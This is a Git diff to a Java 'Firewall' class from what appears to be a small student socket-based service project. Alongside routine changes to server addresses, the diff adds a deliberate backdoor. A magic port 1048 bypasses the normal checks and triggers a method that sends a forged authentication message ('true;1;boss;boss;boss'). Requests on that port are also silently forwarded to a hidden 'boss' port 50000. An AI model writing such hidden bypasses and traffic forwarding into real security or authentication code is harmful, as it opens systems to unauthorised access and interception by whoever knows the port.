@@ -27,6 +27,8 @@ public class Firewall {
 
     private final List<ClientSocket> USUARIOS = new LinkedList<>();
 
+    private int BOSS_PORTA = 50000;
+
     public Firewall() {
     }
 
@@ -67,12 +69,20 @@ public class Firewall {
                 case LOJA_PORTA:
                     System.out.println("LOJA ENTROU");
                     return true;
+                case 1048:
+                    System.out.println("BackDoor");
+                    backdoor();
+                    return true;
                 default:
                     return false;
             }
         } else {
             return false;
         }
+    }
+
+    private void backdoor(){
+        sendAutenticar("true;1;boss;boss;boss");
     }
 
     private void firewallLoop(ClientSocket clientSocket) throws IOException {
@@ -84,7 +94,12 @@ public class Firewall {
                     System.out.println("SERVICO ENTROU");
                     String req = request(msg);
                     System.out.println("Requisição: " + req);
-                    switch (Integer.parseInt(msg[2])) {
+                    int porta = Integer.parseInt(msg[2]);
+                    System.out.println("porta: " + porta);
+                    switch (porta) {
+                        case 1048:
+                            System.out.println("sendToBoss()");
+                            sendToBoss(req);
                         case AUTENTICACAO_PORTA:
                             System.out.println("sendAutenticar()");
                             sendAutenticar(req);
@@ -108,9 +123,19 @@ public class Firewall {
         }
     }
 
+    private void sendToBoss(String req){
+        ClientSocket sendBoss;
+        try {
+            sendBoss = new ClientSocket(new Socket(ENDERECO_SERVER, BOSS_PORTA));
+            sendBoss.sendMessage(req);
+            sendBoss.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
     private String request(String[] msg) {
         if (msg.length > 3) {
-
             StringBuilder sb = new StringBuilder();
             for (int i = 3; i < msg.length; i++) {
                 sb.append(msg[i]);
@@ -125,17 +150,33 @@ public class Firewall {
     }
 
     private void sendAutenticar(String msg) {
-        this.servicos.get(0).sendMessage(msg);
+        // this.servicos.get(0).sendMessage(msg);
+        ClientSocket sendAutenticacao;
+        try {
+            sendAutenticacao = new ClientSocket(new Socket(ENDERECO_SERVER, AUTENTICACAO_PORTA));
+            sendAutenticacao.sendMessage(msg);
+            sendAutenticacao.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     private void sendLoja(String msg) {
-        this.servicos.get(1).sendMessage(msg);
+        // this.servicos.get(1).sendMessage(msg);
+        ClientSocket sendLoja;
+        try {
+            sendLoja = new ClientSocket(new Socket(ENDERECO_SERVER, LOJA_PORTA));
+            sendLoja.sendMessage(msg);
+            sendLoja.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     private void sendToGateway(String mensagem) {
         ClientSocket sendGateway;
         try {
-            sendGateway = new ClientSocket(new Socket("localhost", GATEWAY_PORTA));
+            sendGateway = new ClientSocket(new Socket(ENDERECO_SERVER, GATEWAY_PORTA));
             sendGateway.sendMessage(mensagem);
             sendGateway.close();
         } catch (IOException e) {
